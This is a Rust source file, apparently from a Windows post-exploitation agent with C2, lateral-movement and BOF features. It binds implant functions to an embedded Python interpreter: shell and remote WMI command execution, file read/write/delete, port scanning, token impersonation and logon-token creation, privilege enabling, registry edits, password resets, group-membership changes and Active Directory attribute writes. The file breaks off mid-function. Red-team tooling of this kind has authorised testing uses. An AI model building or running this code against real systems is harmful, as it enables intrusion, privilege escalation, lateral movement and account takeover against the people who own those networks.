//! Python integration module
//!
//! This module contains all Python-related functionality including:
//! - Python C API structures and constants
//! - Helper functions for argument parsing and return values
//! - Python wrapper functions that expose agent functionality
//! - Module creation and registration

use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::ffi::c_void;

use crate::libs;
use crate::libs::instance::PythonApi;
use crate::get_instance;
#[cfg(feature = "execution")]
use crate::inject;
#[cfg(feature = "execution")]
use crate::wmi_execute_command;
#[cfg(any(feature = "enumerate", feature = "network", feature = "priv"))]
use crate::enumerate;
#[cfg(any(feature = "enumerate", feature = "network", feature = "priv"))]
use crate::enumerate::list_procs;
#[cfg(any(feature = "execution", feature = "lateral_movement", feature = "services", feature = "execution"))]
use crate::exec;
#[cfg(feature = "filesystem")]
use crate::fs;
#[cfg(feature = "priv")]
use crate::token;
#[cfg(feature = "registry")]
use crate::reg;
#[cfg(any(feature = "ad", feature = "user"))]
use crate::net;
#[cfg(feature = "ad")]
use crate::ldap;
#[cfg(feature = "execution")]
use crate::shell;
#[cfg(feature = "bof")]
use crate::bof;
#[cfg(feature = "c2")]
use crate::c2;
use crate::mem;

// ============================================================================
// Python C API structures
// ============================================================================

#[repr(C)]
pub struct PyModuleDef {
    ob_base: [usize; 2],  // PyObject_HEAD (refcnt + type)
    m_init: *const c_void,
    m_index: isize,
    m_copy: *const c_void,
    m_name: *const u8,
    m_doc: *const u8,
    m_size: isize,
    m_methods: *const PyMethodDef,
    m_slots: *const c_void,
    m_traverse: *const c_void,
    m_clear: *const c_void,
    m_free: *const c_void,
}

#[repr(C)]
pub struct PyMethodDef {
    pub ml_name: *const u8,
    pub ml_meth: *const c_void,  // Raw pointer to avoid null fn ptr issue
    pub ml_flags: i32,
    pub ml_doc: *const u8,
}

pub const METH_NOARGS: i32 = 0x0004;
pub const METH_VARARGS: i32 = 0x0001;

// ============================================================================
// Helper functions for Python argument parsing
// ============================================================================

/// Get a string argument from Python args tuple at specified index
pub unsafe fn py_get_str_arg(py: &PythonApi, args: *mut c_void, idx: isize) -> Option<String> {
    let inst = get_instance()?;
    let tuple_get = inst.python.tuple_get_item?;
    let item = tuple_get(args, idx);
    if item.is_null() {
        // Clear Python error (IndexError) set by PyTuple_GetItem
        if let Some(err_clear) = inst.python.err_clear {
            err_clear();
        }
        return None;
    }
    let utf8_fn = py.unicode_as_utf8?;
    let cstr = utf8_fn(item);
    if cstr.is_null() {
        // Clear any error from unicode conversion
        if let Some(err_clear) = inst.python.err_clear {
            err_clear();
        }
        return None;
    }
    // Convert to String
    let mut len = 0;
    while *cstr.add(len) != 0 {
        len += 1;
    }
    let slice = core::slice::from_raw_parts(cstr, len);
    Some(String::from_utf8_lossy(slice).into_owned())
}

/// Get an integer argument from Python args tuple at specified index
pub unsafe fn py_get_int_arg(py: &PythonApi, args: *mut c_void, idx: isize) -> Option<i64> {
    let inst = get_instance()?;
    let tuple_get = inst.python.tuple_get_item?;
    let item = tuple_get(args, idx);
    if item.is_null() {
        // Clear Python error (IndexError) set by PyTuple_GetItem
        if let Some(err_clear) = inst.python.err_clear {
            err_clear();
        }
        return None;
    }
    let long_as = py.long_as_long?;
    Some(long_as(item))
}

/// Get bytes argument from Python args tuple at specified index
pub unsafe fn py_get_bytes_arg(py: &PythonApi, args: *mut c_void, idx: isize) -> Option<Vec<u8>> {
    let inst = get_instance()?;
    let tuple_get = inst.python.tuple_get_item?;
    let item = tuple_get(args, idx);
    if item.is_null() {
        // Clear Python error (IndexError) set by PyTuple_GetItem
        if let Some(err_clear) = inst.python.err_clear {
            err_clear();
        }
        return None;
    }
    let bytes_as_string = py.bytes_as_string?;
    let bytes_size = py.bytes_size?;
    let ptr = bytes_as_string(item);
    if ptr.is_null() {
        // Clear any error from bytes conversion
        if let Some(err_clear) = inst.python.err_clear {
            err_clear();
        }
        return None;
    }
    let size = bytes_size(item) as usize;
    let slice = core::slice::from_raw_parts(ptr, size);
    Some(slice.to_vec())
}

// ============================================================================
// Helper functions for Python return values
// ============================================================================

/// Return Python None
pub unsafe fn py_return_none(py: &PythonApi) -> *mut c_void {
    py.py_none
}

/// Return a Python string
pub unsafe fn py_return_string(py: &PythonApi, s: &str) -> *mut c_void {
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };
    let mut cstr = s.as_bytes().to_vec();
    cstr.push(0);
    str_from(cstr.as_ptr())
}

/// Return Python bytes
pub unsafe fn py_return_bytes(py: &PythonApi, data: &[u8]) -> *mut c_void {
    let bytes_from = match py.bytes_from_string_and_size { Some(f) => f, None => return py.py_none };
    bytes_from(data.as_ptr(), data.len() as isize)
}

/// Return Python bool
pub unsafe fn py_return_bool(py: &PythonApi, val: bool) -> *mut c_void {
    if val { py.py_true } else { py.py_false }
}

/// Return Python int
pub unsafe fn py_return_int(py: &PythonApi, val: i64) -> *mut c_void {
    match py.long_from_long {
        Some(f) => f(val),
        None => py.py_none,
    }
}

/// Set Python error from a Windows error code, using FormatMessageW
pub unsafe fn py_set_error_code(py: &PythonApi, code: u32) -> *mut c_void {
    let msg = crate::libs::utils::format_error(code);
    if msg.is_empty() {
        // Fallback: just show "0xDEADBEEF"
        let mut buf = b"0x".to_vec();
        buf.extend_from_slice(&crate::libs::utils::get_hex_from_bytes(&code.to_be_bytes()));
        return py_set_error(py, &buf);
    }
    py_set_error(py, &msg)
}

/// Set Python error and return null
pub unsafe fn py_set_error(py: &PythonApi, msg: &[u8]) -> *mut c_void {
    if let Some(err_set) = py.err_set_string {
        if !py.exc_runtime_error.is_null() {
            let mut msg_cstr = msg.to_vec();
            msg_cstr.push(0);
            err_set(py.exc_runtime_error, msg_cstr.as_ptr());
        }
    }
    core::ptr::null_mut()
}

// ============================================================================
// Python wrapper functions - METH_NOARGS
// ============================================================================

/// List running processes
pub unsafe extern "C" fn py_list_procs(_self: *mut c_void, _args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let procs = list_procs();

    let result = list_new(0);
    if result.is_null() {
        return py.py_none;
    }

    for proc in &procs {
        let dict = dict_new();
        if dict.is_null() {
            continue;
        }

        // Add pid
        let pid_obj = long_from(proc.pid as i64);
        dict_set(dict, b"pid\0".as_ptr(), pid_obj);

        // Add ppid
        let ppid_obj = long_from(proc.ppid as i64);
        dict_set(dict, b"ppid\0".as_ptr(), ppid_obj);

        // Add image name
        let mut image_cstr = proc.image.as_bytes().to_vec();
        image_cstr.push(0);
        let image_obj = str_from(image_cstr.as_ptr());
        dict_set(dict, b"image\0".as_ptr(), image_obj);

        // Add cmdline if present
        if let Some(ref cmdline) = proc.cmdline {
            let mut cmd_cstr = cmdline.as_bytes().to_vec();
            cmd_cstr.push(0);
            let cmd_obj = str_from(cmd_cstr.as_ptr());
            dict_set(dict, b"cmdline\0".as_ptr(), cmd_obj);
        }

        list_append(result, dict);
    }

    result
}

/// Get current working directory
pub unsafe extern "C" fn py_get_cwd(_self: *mut c_void, _args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    match fs::get_cwd() {
        Ok(cwd) => py_return_string(py, &cwd),
        Err(e) => py_set_error_code(py, e),
    }
}

/// List privileges of current thread
pub unsafe extern "C" fn py_list_thread_privs(_self: *mut c_void, _args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let privs = match token::list_current_thread_privs() {
        Ok(p) => p,
        Err(e) => return py_set_error_code(py, e),
    };

    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    for privilege in &privs {
        let dict = dict_new();

        let mut name_cstr = privilege.name.as_bytes().to_vec();
        name_cstr.push(0);
        dict_set(dict, b"name\0".as_ptr(), str_from(name_cstr.as_ptr()));
        dict_set(dict, b"enabled\0".as_ptr(), py_return_bool(py, privilege.enabled));

        list_append(result, dict);
    }
    result
}

/// Revert to original token
pub unsafe extern "C" fn py_revert_to_self(_self: *mut c_void, _args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    match token::revert_to_self() {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Python wrapper functions - METH_VARARGS
// ============================================================================

/// Execute a shell command
pub unsafe extern "C" fn py_run_command(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let command = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"command argument required"),
    };

    match exec::run_command(&command) {
        Ok(output) => py_return_string(py, &output),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Read file contents
pub unsafe extern "C" fn py_read_file(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };

    match fs::read_file(&path) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Write data to file
pub unsafe extern "C" fn py_write_file(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };

    let data = match py_get_bytes_arg(py, args, 1) {
        Some(d) => d,
        None => return py_set_error(py, b"data argument required"),
    };

    match fs::write_file(&path, data) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Delete a file
pub unsafe extern "C" fn py_delete_file(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };

    match fs::delete_file(&path) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Resolve hostname to IP
pub unsafe extern "C" fn py_resolve_hostname(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let hostname = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"hostname argument required"),
    };

    let result = libs::winsock::resolve_hostname(&hostname);
    if result.is_empty() {
        py_set_error(py, b"resolve failed")
    } else {
        // Convert bytes to string for Python
        let ip_str = core::str::from_utf8(&result).unwrap_or("");
        py_return_string(py, ip_str)
    }
}

/// Execute via ShellExecute
pub unsafe extern "C" fn py_shell_execute(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };
    let verb = py_get_str_arg(py, args, 1).unwrap_or_default();
    let shell_args = py_get_str_arg(py, args, 2).unwrap_or_default();

    match shell::shell_execute(&path, &verb, &shell_args) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Extract ZIP file
pub unsafe extern "C" fn py_shell_extract(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let zip_path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"zip_path argument required"),
    };

    match shell::shell_extract_zip(&zip_path) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Scan ports on targets
pub unsafe extern "C" fn py_portscan(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let targets = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"targets argument required"),
    };
    let ports = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"ports argument required"),
    };

    let results = match enumerate::portscan(&targets, &ports) {
        Ok(r) => r,
        Err(e) => return py_set_error_code(py, e),
    };

    // Convert to list of dicts
    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    for r in &results {
        let dict = dict_new();

        let mut host_cstr = r.host.as_bytes().to_vec();
        host_cstr.push(0);
        dict_set(dict, b"host\0".as_ptr(), str_from(host_cstr.as_ptr()));
        dict_set(dict, b"port\0".as_ptr(), long_from(r.port as i64));
        dict_set(dict, b"open\0".as_ptr(), py_return_bool(py, r.open));

        list_append(result, dict);
    }
    result
}

/// List privileges of a process
pub unsafe extern "C" fn py_list_process_privs(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    // Optional PID argument
    let pid = py_get_int_arg(py, args, 0).map(|p| p as u32);

    let privs = match token::list_process_privs(pid) {
        Ok(p) => p,
        Err(e) => return py_set_error_code(py, e),
    };

    // Convert to list of dicts
    let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
    let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
    let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
    let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
    let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };

    let result = list_new(0);
    for privilege in &privs {
        let dict = dict_new();

        let mut name_cstr = privilege.name.as_bytes().to_vec();
        name_cstr.push(0);
        dict_set(dict, b"name\0".as_ptr(), str_from(name_cstr.as_ptr()));
        dict_set(dict, b"enabled\0".as_ptr(), py_return_bool(py, privilege.enabled));

        list_append(result, dict);
    }
    result
}

/// Impersonate a process token
pub unsafe extern "C" fn py_impersonate_process(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let pid = match py_get_int_arg(py, args, 0) {
        Some(p) => p as u32,
        None => return py_set_error(py, b"pid argument required"),
    };

    match token::impersonate_process(pid) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Create a logon token
pub unsafe extern "C" fn py_make_token(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let domain = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"domain argument required"),
    };
    let username = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let password = match py_get_str_arg(py, args, 2) {
        Some(s) => s,
        None => return py_set_error(py, b"password argument required"),
    };
    let logon_type = py_get_int_arg(py, args, 3).map(|t| t as u32);

    match token::make_token(&domain, &username, &password, logon_type) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

/// Enable a privilege
pub unsafe extern "C" fn py_enable_privilege(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let priv_name = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"privilege name argument required"),
    };

    match token::enable_process_privilege(&priv_name) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// Registry functions
// ============================================================================

#[cfg(feature = "registry")]
pub unsafe extern "C" fn py_reg_create_key(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let key_path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"key_path argument required"),
    };

    match reg::reg_create_key(&key_path) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

#[cfg(feature = "registry")]
pub unsafe extern "C" fn py_reg_delete_key(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let key_path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"key_path argument required"),
    };

    match reg::reg_delete_key(&key_path) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

#[cfg(feature = "registry")]
pub unsafe extern "C" fn py_reg_set_value(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let key_path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"key_path argument required"),
    };
    let value_name = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"value_name argument required"),
    };
    let value_type = match py_get_str_arg(py, args, 2) {
        Some(s) => s,
        None => return py_set_error(py, b"value_type argument required"),
    };
    let value = match py_get_bytes_arg(py, args, 3) {
        Some(d) => d,
        None => return py_set_error(py, b"value argument required"),
    };

    match reg::reg_set_value(&key_path, &value_name, &value_type, &value) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

#[cfg(feature = "registry")]
pub unsafe extern "C" fn py_reg_query_value(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let key_path = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"key_path argument required"),
    };
    let value_name = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"value_name argument required"),
    };

    match reg::reg_query_value(&key_path, &value_name) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// User/Group management functions
// ============================================================================

pub unsafe extern "C" fn py_set_user_password(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let username = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let password = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"password argument required"),
    };
    let server = py_get_str_arg(py, args, 2);

    match net::set_user_password(server.as_deref(), &username, &password) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

pub unsafe extern "C" fn py_add_user_to_localgroup(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let group = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"group argument required"),
    };
    let username = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let server = py_get_str_arg(py, args, 2);

    match net::add_user_to_localgroup(server.as_deref(), &group, &username) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

pub unsafe extern "C" fn py_remove_user_from_localgroup(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let group = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"group argument required"),
    };
    let username = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let server = py_get_str_arg(py, args, 2);

    match net::remove_user_from_localgroup(server.as_deref(), &group, &username) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

pub unsafe extern "C" fn py_get_user_sid(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let username = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let server = py_get_str_arg(py, args, 1);

    match net::get_user_sid(server.as_deref(), &username) {
        Ok(sid) => py_return_string(py, &sid),
        Err(e) => py_set_error_code(py, e),
    }
}

pub unsafe extern "C" fn py_add_user_to_group(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let group = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"group argument required"),
    };
    let username = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let server = py_get_str_arg(py, args, 2).unwrap_or_default();

    match net::add_user_to_group(&server, &group, &username) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

pub unsafe extern "C" fn py_remove_user_from_group(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let group = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"group argument required"),
    };
    let username = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"username argument required"),
    };
    let server = py_get_str_arg(py, args, 2).unwrap_or_default();

    match net::remove_user_from_group(&server, &group, &username) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// LDAP functions
// ============================================================================

#[cfg(feature = "ad")]
pub unsafe extern "C" fn py_query_ldap(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    // Args: base, filter, scope (optional, default 2=subtree)
    // Uses serverless binding (auto-discovers DC)
    let base = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"base argument required"),
    };
    let filter = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"filter argument required"),
    };
    let scope = py_get_int_arg(py, args, 2).unwrap_or(2) as u32; // default LDAP_SCOPE_SUBTREE

    match ldap::query_ldap("", "", &base, &filter, scope, None, None, None, None) {
        Ok(entries) => {
            // Convert to list of lists (each entry is a list of attribute dicts)
            let list_new = match py.list_new { Some(f) => f, None => return py.py_none };
            let list_append = match py.list_append { Some(f) => f, None => return py.py_none };
            let dict_new = match py.dict_new { Some(f) => f, None => return py.py_none };
            let dict_set = match py.dict_set_item_string { Some(f) => f, None => return py.py_none };
            let str_from = match py.unicode_from_string { Some(f) => f, None => return py.py_none };
            let bytes_from = match py.bytes_from_string_and_size { Some(f) => f, None => return py.py_none };

            let entries_list = list_new(0);
            for entry_attrs in &entries {
                let attrs_list = list_new(0);
                for attr in entry_attrs {
                    let attr_dict = dict_new();

                    // Add attribute name
                    let mut name_cstr = attr.attr_name.as_bytes().to_vec();
                    name_cstr.push(0);
                    dict_set(attr_dict, b"attr_name\0".as_ptr(), str_from(name_cstr.as_ptr()));

                    // Add is_binary flag
                    dict_set(attr_dict, b"is_binary\0".as_ptr(), py_return_bool(py, attr.is_binary));

                    // Add string values
                    let str_vals_list = list_new(0);
                    for v in &attr.str_val {
                        let mut v_cstr = v.as_bytes().to_vec();
                        v_cstr.push(0);
                        list_append(str_vals_list, str_from(v_cstr.as_ptr()));
                    }
                    dict_set(attr_dict, b"str_val\0".as_ptr(), str_vals_list);

                    // Add binary values
                    let bin_vals_list = list_new(0);
                    for v in &attr.bin_val {
                        list_append(bin_vals_list, bytes_from(v.as_ptr(), v.len() as isize));
                    }
                    dict_set(attr_dict, b"bin_val\0".as_ptr(), bin_vals_list);

                    list_append(attrs_list, attr_dict);
                }
                list_append(entries_list, attrs_list);
            }
            entries_list
        },
        Err(e) => py_set_error_code(py, e),
    }
}

#[cfg(feature = "ad")]
pub unsafe extern "C" fn py_set_ad_attr_str(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    // Args: server, dn, attribute, value
    let server = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"server argument required"),
    };
    let dn = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"dn argument required"),
    };
    let attr = match py_get_str_arg(py, args, 2) {
        Some(s) => s,
        None => return py_set_error(py, b"attr argument required"),
    };
    let value = match py_get_str_arg(py, args, 3) {
        Some(s) => s,
        None => return py_set_error(py, b"value argument required"),
    };

    match ldap::set_ad_attr_str(&server, &dn, &attr, &value, None, None, None) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

#[cfg(feature = "ad")]
pub unsafe extern "C" fn py_set_ad_attr_bin(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    // Args: server, dn, attribute, value (bytes)
    let server = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"server argument required"),
    };
    let dn = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"dn argument required"),
    };
    let attr = match py_get_str_arg(py, args, 2) {
        Some(s) => s,
        None => return py_set_error(py, b"attr argument required"),
    };
    let value = match py_get_bytes_arg(py, args, 3) {
        Some(d) => d,
        None => return py_set_error(py, b"value argument required"),
    };

    match ldap::set_ad_attr_bin(&server, &dn, &attr, Some(&value), None, None, None) {
        Ok(_) => py_return_none(py),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// HTTP/Network functions
// ============================================================================

#[cfg(feature = "network")]
pub unsafe extern "C" fn py_http_send(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let method = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"method argument required"),
    };
    let host = match py_get_str_arg(py, args, 1) {
        Some(s) => s,
        None => return py_set_error(py, b"host argument required"),
    };
    let port = match py_get_int_arg(py, args, 2) {
        Some(p) => p as u16,
        None => return py_set_error(py, b"port argument required"),
    };
    let path = match py_get_str_arg(py, args, 3) {
        Some(s) => s,
        None => return py_set_error(py, b"path argument required"),
    };
    let secure = py_get_int_arg(py, args, 4).map(|s| s != 0).unwrap_or(false);
    let body = py_get_str_arg(py, args, 5);

    use libs::winhttp::HttpClient;
    let client = match HttpClient::new() {
        Ok(c) => c,
        Err(e) => return py_set_error_code(py, e),
    };

    match client.send(&method, &host, port, &path, secure, body.as_deref()) {
        Ok(data) => py_return_bytes(py, &data),
        Err(e) => py_set_error_code(py, e),
    }
}

// ============================================================================
// WMI execution
// ============================================================================

pub unsafe extern "C" fn py_wmi_exec(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let command = match py_get_str_arg(py, args, 0) {
        Some(s) => s,
        None => return py_set_error(py, b"command argument required"),
    };
    let host = py_get_str_arg(py, args, 1);
    let user = py_get_str_arg(py, args, 2);
    let pass = py_get_str_arg(py, args, 3);

    match wmi_execute_command(&command, host.as_deref(), user.as_deref(), pass.as_deref()) {
        Ok(pid) => {
            let long_from = match py.long_from_long { Some(f) => f, None => return py.py_none };
            long_from(pid as i64)
        },
        Err(code) => py_set_error_code(py, code),
    }
}

// ============================================================================
// BOF execution
// ============================================================================

#[cfg(feature = "bof")]
pub unsafe extern "C" fn py_run_bof(_self: *mut c_void, args: *mut c_void) -> *mut c_void {
    let inst = match get_instance() {
        Some(i) => i,
        None => return core::ptr::null_mut(),
    };
    let py = &inst.python;

    let bof_data = match py_get_bytes_arg(py, args, 0) {
        Some(d) => d,
        None => return py_set_error(py, b"bof_data argument required"),
    };
    let entry = py_get_str_arg(py, args, 1).unwrap_or_else(|| "go".to_string());
    let inputs = py_get_str_arg(py, args, 2).unwrap_or_default();

